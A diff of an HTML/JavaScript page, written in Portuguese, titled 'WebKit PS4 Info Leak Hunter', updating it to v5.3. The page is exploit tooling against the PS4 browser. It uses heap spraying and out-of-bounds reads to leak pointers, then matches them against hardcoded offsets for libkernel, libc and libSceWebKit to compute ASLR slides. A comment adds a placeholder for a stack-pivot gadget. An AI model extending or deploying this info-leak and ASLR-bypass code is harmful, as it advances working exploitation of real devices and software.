@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>WebKit PS4 Info Leak Hunter v5.2 (Log Corrigido)</title>
+    <title>WebKit PS4 Info Leak Hunter v5.3 (com libSceWebKit)</title>
     <style>
         /* Estilos mantidos como na v4/v5 */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
@@ -16,14 +16,13 @@
         .log-good { color: #4CAF50; }
         .log-warn { color: #FFC107; }
         .log-error { color: #f44336; }
-        .log-critical { color: #f0f; font-weight: bold; } /* Usado para resultado final U64 */
-        .log-leak { color: #FF9800; font-weight: bold; } /* Usado para resultado final U32 */
+        .log-critical { color: #f0f; font-weight: bold; }
+        .log-leak { color: #FF9800; font-weight: bold; }
         .log-ptr { color: #f0f; font-weight: bold; }
         .log-spray { color: #9C27B0; }
         .log-gc { color: #00BCD4; }
         .log-debug { color: #795548; font-style: italic; font-size: 0.9em; }
         .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
-        /* Novos estilos para a análise de bibliotecas */
         .log-analysis_ptr { color: #da70d6; }
         .log-analysis_lib { color: #add8e6; }
         .log-analysis_info { color: #b0c4de; }
@@ -33,9 +32,9 @@
     </style>
 </head>
 <body>
-    <h1>WebKit PS4 Info Leak Hunter v5.2 (Log Corrigido)</h1>
-    <p>Tenta Heap Spray/Grooming Agressivo, Leitura OOB Ampla e Log de Quase Todos os U64 com análise de biblioteca integrada.</p>
-    <button id="runBtn" onclick="runAdvancedInfoLeakTest()">Iniciar Teste Avançado de Info Leak v5.2</button>
+    <h1>WebKit PS4 Info Leak Hunter v5.3 (com libSceWebKit)</h1>
+    <p>Tenta Heap Spray/Grooming, Leitura OOB e Log de U64 com análise de biblioteca integrada (incluindo libSceWebKit).</p>
+    <button id="runBtn" onclick="runAdvancedInfoLeakTest()">Iniciar Teste Avançado de Info Leak v5.3</button>
     <div id="output"></div>
 
     <script>
@@ -48,32 +47,49 @@
         let sprayObjectsContainer = [];
 
         // --- Definição das Bibliotecas e Símbolos Conhecidos ---
-        // !!! IMPORTANTE: Preencha esta seção com os dados dos seus arquivos .txt !!!
+        // !!! IMPORTANTE: REVISE E COMPLETE ESTA ESTRUTURA CUIDADOSAMENTE !!!
         const knownLibraries = {
             'libkernel': {
                 referenceBase: 0x80FCA000,
                 symbols: {
                     '_init': 0x0, 'sceKernelMprotect': 0x24280, 'pipe': 0x5F0,
-                    'mprotect': 0xA10, 'munmap': 0x9F0, 'getpid': 0x6F0,
-                    'kqueue': 0x1270, 'kevent': 0x12A0,
+                    'kqueue': 0x1270, 'kevent': 0x12A0, 'mmap': 0x7B0,
+                    'munmap': 0x9F0, 'mprotect': 0xA10, 'getpid': 0x6F0,
+                    'getuid': 0x700, 'setuid': 0x720, 'ioctl': 0xA70,
                 }
             },
             'libc': {
                 referenceBase: 0x180AC8000,
                 symbols: {
-                    '_init': 0x0, 'malloc': 0x28D60, 'free': 0x28D70,
-                    'memcpy': 0x10F0, 'memset': 0x1070, 'strlen': 0x1160,
-                    'calloc': 0x28DD0, 'realloc': 0x28DE0,
+                    '_init': 0x0, 'memcpy': 0x10F0, 'memset': 0x1070,
+                    'strlen': 0x1160, 'strcpy': 0x11B0, 'strcat': 0x1230,
+                    'strcmp': 0x12A0, 'calloc': 0x28DD0, 'realloc': 0x28DE0,
+                    'malloc': 0x28D60, 'free': 0x28D70,
                 }
             },
             'libkernel_web': {
                 referenceBase: null,
                 symbols: {
-                    '_init': 0x0, 'open': 0x1C2E0, 'read': 0xD9C0, 'write': 0xE6A0,
-                    'close': 0x2A7C0, 'socket': 0xB70, 'bind': 0xC10, 'listen': 0x2A30,
-                    'accept': 0xC50, 'connect': 0xB90, 'setsockopt': 0xC30,
-                    'aio_submit_cmd': 0x1B50, 'aio_multi_delete': 0x1B40,
-                    'getdents': 0xC80,
+                    '_init': 0x0, 'open': 0x1C2E0, 'read': 0xD9C0,
+                    'write': 0xE6A0, 'close': 0x2A7C0, 'socket': 0xB70,
+                    'bind': 0xC10, 'listen': 0x2A30, 'accept': 0xC50,
+                    'connect': 0xB90, 'setsockopt': 0xC30, 'getdents': 0xC80,
+                    'select': 0x1BA0, 'aio_submit_cmd': 0x1B50,
+                    'aio_multi_delete': 0x1B40,
+                }
+            },
+            'libSceWebKit': { // Baseado no seu novo arquivo licSceNKWebKit.sprx.txt.txt
+                referenceBase: null, // PREENCHA SE VOCÊ TIVER UMA BASE DE REFERÊNCIA PARA ELA, SENÃO null.
+                symbols: {
+                    // !!! VOCÊ PRECISA PREENCHER ESTA SEÇÃO COM SÍMBOLOS E OFFSETS REAIS !!!
+                    // Extraia de licSceNKWebKit.sprx.txt.txt.
+                    // Exemplo de como adicionar um símbolo:
+                    // 'JSC::JSFunction::call': 0xSEU_OFFSET_AQUI,
+                    // 'WTF::StringImpl::construct': 0xOUTRO_OFFSET_AQUI,
+                    // 'gadget_pivot_stack': 0xOFFSET_DO_GADGET_AQUI,
+                    // 'LAB_00000000': 0x0, // Se este for o início real do .text
+                    // 'LAB_0019f313': 0x0019f313, // Exemplo do seu snippet
+                    // 'outroLabelImportante': 0xSEUOFFSET,
                 }
             }
         };
@@ -84,19 +100,16 @@
                 const timestamp = `[${new Date().toLocaleTimeString()}]`;
                 const prefix = funcName ? `[${funcName}] ` : '';
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-
                 const validLogClasses = [
                     'info', 'test', 'vuln', 'good', 'warn', 'error', 'critical',
                     'leak', 'ptr', 'spray', 'gc', 'debug', 'escalation',
                     'analysis_ptr', 'analysis_lib', 'analysis_info',
                     'analysis_base', 'analysis_slide', 'analysis_match'
                 ];
-
-                let logClassToApply = 'log-info'; // Default
+                let logClassToApply = 'log-info';
                 if (validLogClasses.includes(type)) {
                     logClassToApply = `log-${type}`;
                 }
-
                 const shouldScroll = !outputDiv.matches(':hover') && type !== 'debug';
                 if(outputDiv.innerHTML.length > 1500000){
                     outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 750000);
@@ -104,18 +117,15 @@
                     truncationSpan.textContent = "[Log Truncado...]\n";
                     outputDiv.insertBefore(truncationSpan, outputDiv.firstChild);
                 }
-
                 const span = document.createElement('span');
                 span.className = logClassToApply;
                 span.textContent = `${timestamp} ${prefix}${sanitizedMessage}\n`;
                 outputDiv.appendChild(span);
-
                 if (shouldScroll) {
                     outputDiv.scrollTop = outputDiv.scrollHeight;
                 }
             } catch(e) { console.error("Erro no logging:", e); if (outputDiv) {const errSpan = document.createElement('span'); errSpan.className='log-error'; errSpan.textContent = `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; outputDiv.appendChild(errSpan);} }
         };
-
 
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
 
@@ -149,11 +159,16 @@
                     let pageAligned = false;
                     if (library.referenceBase !== null && typeof library.referenceBase !== 'undefined') {
                         aslrSlide = potentialBase - BigInt(library.referenceBase);
-                        aslrSlideHex = toHex(aslrSlide, 64);
+                        aslrSlideHex = toHex(aslrSlide, 64); // Usar 64 bits para o slide
                         matchLog += ` (Slide ASLR: ${aslrSlideHex})`;
-                        if (aslrSlide % 0x4000n === 0n && aslrSlide >= 0n) {
+                        if (aslrSlide >= 0n && aslrSlide % 0x4000n === 0n) { // Slide geralmente positivo e alinhado
                             pageAligned = true;
                             matchLog += " - ALINHADO À PÁGINA (0x4000)!";
+                        }
+                    } else { // Sem base de referência, checa apenas se a base potencial é alinhada
+                        if (potentialBase >= 0n && potentialBase % 0x4000n === 0n) {
+                             pageAligned = true; // Consideramos alinhado mesmo sem slide, pode ser um bom indicador
+                             matchLog += " - BASE POTENCIAL ALINHADA (0x4000)!";
                         }
                     }
                     log(matchLog, pageAligned ? 'analysis_match' : 'analysis_info', `[${libName.toUpperCase()}]`);
@@ -167,7 +182,7 @@
                 }
             }
             if (strongCandidates.length > 0) {
-                log(`Candidatos Fortes (Slide Alinhado) para ${leakedPtrHex}:`, 'analysis_base', 'ANALYZE_SUM');
+                log(`Candidatos Fortes (Base/Slide Alinhado) para ${leakedPtrHex}:`, 'analysis_base', 'ANALYZE_SUM');
                 strongCandidates.forEach(c => {
                      log(`  Lib: ${c.libName}, Símbolo: ${c.symbolName}, Base Potencial: ${c.potentialBaseHex}, Slide: ${c.aslrSlideHex}`, 'analysis_base', 'ANALYZE_SUM');
                 });
@@ -327,7 +342,7 @@
             outputDiv.innerHTML = '';
             leakedValueFromOOB = null; 
             sprayObjectsContainer = [];
-            log("==== INICIANDO WebKit PS4 Info Leak Hunter v5.2 (Log Corrigido) ====", 'test', FNAME);
+            log("==== INICIANDO WebKit PS4 Info Leak Hunter v5.3 (com libSceWebKit) ====", 'test', FNAME);
             await PAUSE(MEDIUM_PAUSE);
             log("--- Fase 1: Heap Spraying (Agressivo) ---", 'test', FNAME);
             performArrayBufferSpray(0x800, 0x8000, 0xDEADBEEF, 0xCAFEBABE);
@@ -352,7 +367,7 @@
                 log("-> Analise os logs 'Considerado POTENCIAL!' e 'ANALYZE_PTR' para verificar se houve candidatos e suas análises.", 'warn', FNAME);
                 alert("Nenhum leak não-padrão foi armazenado. Verifique os logs detalhados para análise de biblioteca.");
             }
-            log("\n==== WebKit PS4 Info Leak Hunter v5.2 (Log Corrigido) CONCLUÍDO ====", 'test', FNAME);
+            log("\n==== WebKit PS4 Info Leak Hunter v5.3 (com libSceWebKit) CONCLUÍDO ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
     </script>
